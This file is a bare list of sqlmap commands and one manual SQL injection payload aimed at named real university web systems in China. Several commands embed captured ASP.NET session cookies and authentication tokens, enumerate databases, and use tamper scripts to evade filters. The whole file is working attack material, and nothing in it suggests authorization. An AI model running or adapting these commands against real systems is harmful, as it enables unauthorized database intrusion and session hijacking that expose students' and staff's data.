python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/jwweb/JXJH/INFO_KC.aspx?id=040172" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45
python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/jwweb/WSXK/Private/List_WSXK_NJZY.aspx?id=0&xklb=2&xn=2015&xq=1" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45  --dbms 'Microsoft SQL Server'
python sqlmap.py -u "" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45
python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/_data/read_detail_glgd.aspx?rid=2" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45

python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/znpk/Pri_TeacKCJXRW_SKBJ.aspx?xnxq=20151&skbj=040175-003" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45; .ASPXAUTH=8A9BEC4AF0FC9DA8160DA4817ABEC1012AF5E2C2E82982855D07232958AD21A383901663B84A585AD58AD761708B234101EF21B69FC9DAE09F1C8E0FD60B4990C4B68575A3547C0FB6AAC4447B0AFA7D6A49B8D68FC13BB97F4C31896337823BE78416B6D3890C240EB87283C3F4B35155AAB1FF --dbms 'Microsoft SQL Server'

http://jiaowu.pdsu.edu.cn/jwweb/_data/index_LOGIN.aspx
' and @@version>0--
sqlmap.py -u "http://stu.gxufe.cn/xsweb/pub/temp.aspx?type=menu&nj=wooyun" --tamper "equaltolike.py" --dbms mssql --dbs
python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/znpk/Pri_TeacKCJXRW_SKBJ.aspx?xnxq=20151&skbj=040175-003" --cookie=ASP.NET_SessionId=ojvrfa45amqnqc551iqrly45;.ASPXAUTH=24645A598C08D1FABAD5C64BE3778A0A073FCC886078A636943BF6247FBBBAF07C05F076F897C5E2D15BBB525F08D3408E9C402A799112C9E2730817F9CA7A52A4FE2F6127BAA24B942CB7E1C39B52D1455B3504F9D7EE283C80160D447138C0DF7A61A4B8A269FBC7A747D16A97332D0F072327 --tamper "equaltolike.py" --dbms mssql --dbs

python sqlmap.py -u "http://yyxt.pdsu.edu.cn/pdsunews/shownewss.aspx?newsid=16823"
python sqlmap.py -u "http://jiaowu.pdsu.edu.cn/_data/index_downall.aspx?page=2&ft=&txt_title=&txt_ksrq=&txt_jsrq=&chk_fbsj=" --dbms mssql --dbs